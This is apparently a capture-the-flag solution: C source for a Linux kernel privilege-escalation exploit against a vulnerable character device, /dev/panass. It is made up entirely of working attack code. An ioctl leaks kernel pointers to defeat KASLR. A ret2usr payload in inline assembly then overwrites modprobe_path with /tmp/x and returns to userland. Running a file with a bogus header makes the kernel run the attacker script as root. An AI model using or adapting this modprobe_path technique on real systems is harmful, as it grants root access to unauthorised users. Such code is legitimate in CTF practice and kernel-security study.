#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/signal.h>

unsigned long kleak, kbase, mprobe;

unsigned long user_cs, user_ss, user_rflags, user_sp, user_rip;

void modprobe_trigger(void) {
    printf("[+] Back to userland safely. now \n");
    system("echo '#!/bin/sh\nchmod 777 /flag' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
    system("/tmp/dummy");
    printf("[+] le flag:\n");
    system("cat /flag");
}
   
void quit(void){
	exit(0);
}
void prepare_tf(void) {
    asm("mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;");
    user_rip = (unsigned long)modprobe_trigger;
}
void abuse_probe(void){
    asm("xor rax, rax;"
        "xor rbx, rbx;"
        "xor r15, 15;"
        "mov rax, 0x782f706d742f;" // /tmp/x
        "mov rbx, mprobe;" // the modprobe path
        "mov qword ptr [rbx], rax;" // set the path of modprobe to /tmp/x
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        );
}


int main(){
	signal(SIGSEGV, quit);
	int fd = open("/dev/panass", O_RDWR);
	ioctl(fd, 0x1336, 300);
	unsigned long leak[300];
	
	read(fd, leak, 300);
	for(int i = 0; i < 30; i++){
		printf("idx %d val 0x%llx\n", i, leak[i]);
	}
	kleak = leak[29];
	kbase = kleak - 0x20007cL;
	mprobe = kbase + 0x14457a0L;
	printf("[+] Kernel base 0x%llx\n", kbase);
	printf("[+] Probe 0x%llx\n", mprobe);
	prepare_tf();
	ioctl(fd, 0x1337, (size_t)abuse_probe); // trigger ret2usr

}
